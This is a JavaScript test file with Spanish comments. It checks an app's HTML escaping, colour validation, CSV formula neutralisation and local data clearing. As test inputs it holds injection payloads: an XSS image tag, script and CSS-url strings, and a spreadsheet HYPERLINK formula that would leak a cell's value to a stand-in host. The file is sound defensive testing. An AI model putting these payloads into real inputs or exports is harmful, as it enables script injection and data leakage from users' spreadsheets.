// Controles de seguridad: escape de HTML, colores seguros, CSV sin fórmulas, limpieza de datos locales.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { esc } from '../public/src/shared/html.js';
import { safeColor } from '../public/src/shared/colors.js';
import { boxScoreCsv } from '../public/src/application/csv-export.js';
import { clearLocalAppData } from '../public/src/infrastructure/platform/local-data.js';
import { makeGame } from './fixtures.js';

test('esc escapa los caracteres peligrosos de HTML', () => {
  assert.equal(esc('<img src=x onerror="alert(1)">'), '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
  assert.equal(esc("O'Neil & Co"), 'O&#39;Neil &amp; Co');
  assert.equal(esc(null), '');
});

test('safeColor solo acepta #rrggbb', () => {
  assert.equal(safeColor('#1D4fc4', '#000000'), '#1D4fc4');
  assert.equal(safeColor('red;background-image:url(//x)', '#000000'), '#000000');
  assert.equal(safeColor('#fff', '#000000'), '#000000');
  assert.equal(safeColor('#1d4fc4"><script>', '#000000'), '#000000');
  assert.equal(safeColor(undefined, '#123456'), '#123456');
});

test('el CSV neutraliza fórmulas y conserva los números', () => {
  const game = makeGame();
  game.roster[0].name = '=HYPERLINK("http://x/?"&A1,"x")';
  game.roster[1].name = '+cmd';
  game.roster[2].name = '@SUM(A1)';
  const lines = boxScoreCsv(game).split('\n');
  assert.ok(lines[1].includes(`"'=HYPERLINK(""http://x/?""&A1,""x"")"`));
  assert.ok(lines[2].includes("'+cmd"));
  assert.ok(lines[3].includes("'@SUM(A1)"));
  assert.ok(lines[1].endsWith(',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0'), 'los ceros numéricos no llevan prefijo');
});

test('clearLocalAppData borra solo las claves de la app', () => {
  const data = new Map([['pb-setup-u1', '{}'], ['pb-allowed-u1', '1'], ['pb-demo-db-v1', '{}'], ['otra-app', 'x']]);
  const fake = {
    getItem: (k) => data.get(k) ?? null,
    removeItem: (k) => data.delete(k),
    setItem: (k, v) => data.set(k, v)
  };
  const keysProxy = new Proxy(fake, { ownKeys: () => [...data.keys()], getOwnPropertyDescriptor: () => ({ enumerable: true, configurable: true }) });
  const previous = globalThis.localStorage;
  globalThis.localStorage = keysProxy;
  try { clearLocalAppData(); } finally { globalThis.localStorage = previous; }
  assert.deepEqual([...data.keys()], ['otra-app']);
});
